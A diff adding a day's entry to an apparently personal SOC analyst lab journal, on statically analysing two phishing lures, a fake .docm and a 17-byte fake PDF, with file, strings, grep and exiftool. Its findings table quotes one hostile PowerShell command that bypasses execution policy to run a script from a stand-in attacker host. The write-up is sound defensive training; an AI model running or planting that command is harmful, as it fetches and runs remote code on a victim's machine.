@@ -76,3 +76,47 @@ Today I focused on tracing malicious infrastructure — from a suspicious domain
 > 🧠 **Key Analyst Lesson:** Cloud hosting (AWS, Azure, GCP) is not a safety signal. Attackers deliberately use trusted infrastructure to bypass reputation-based filters. Always combine multiple signals before making a verdict.
 
 ---
+
+## 📅 Day 4: Attachments & Payload Thinking
+
+Today I shifted focus from links to files — performing static analysis on suspicious 
+attachments to extract hidden commands without ever executing them.
+
+### Key Skills Demonstrated:
+
+* **File Masquerading Detection:** Used `file` command to unmask an `invoice_details.docm` 
+  disguised as a Word document — revealed as plain `ASCII text`, not a real `.docm`.
+* **Hidden Payload Extraction:** Used `strings` and `grep` to surface a concealed 
+  `powershell.exe -ExecutionPolicy Bypass` command buried inside the fake document.
+* **Metadata Forensics:** Used `exiftool` to analyze `meeting_invite.pdf` and identified 
+  critical inconsistencies — `MIME Type: text/plain` and `File Size: 17 bytes` — 
+  exposing it as a fake PDF lure.
+
+### Lab Evidence:
+
+![Static Analysis - Payload Extraction & Metadata Forensics](https://github.com/musabumair-cyber/soc-analyst-real-world-labs/blob/main/week-02-phishing-analysis/Images%20Proof/Screenshot%202026-04-22%20084642.png)
+*Figure 7: `strings` + `grep` revealing hidden PowerShell execution bypass command inside 
+a fake `.docm`, and `exiftool` exposing a 17-byte fake PDF with `MIME Type: text/plain`.*
+
+---
+
+### 🔎 Final SOC Analysis Report
+
+| Artifact | Finding | Risk Level |
+|---|---|---|
+| `invoice_details.docm` | `file` identified as ASCII text — not a real Word doc | 🚨 CRITICAL |
+| Hidden Command | `powershell.exe -ExecutionPolicy Bypass -File \\attacker-ip\payload.ps1` | 🚨 CRITICAL |
+| `meeting_invite.pdf` | File size only 17 bytes — real PDFs are 50KB–500KB+ | ⚠️ HIGH |
+| MIME Type | `text/plain` masquerading as `.pdf` | ⚠️ HIGH |
+
+**Conclusion:** Both attachments were confirmed malicious lures using the **masquerading 
+technique (T1036)**. The `.docm` file concealed a PowerShell command designed to 
+bypass Windows security policies and reach back to an attacker-controlled IP. The 
+fake `.pdf` was a delivery test dummy. Neither file required execution to detect — 
+static analysis alone was sufficient to classify both as **CRITICAL threats**.
+
+> 🧠 **Key Analyst Lesson:** A legitimate invoice sent to an accountant has **zero** 
+> reason to contain a PowerShell script. Any office document triggering 
+> `ExecutionPolicy Bypass` is an immediate escalation — no further confirmation needed.
+
+---
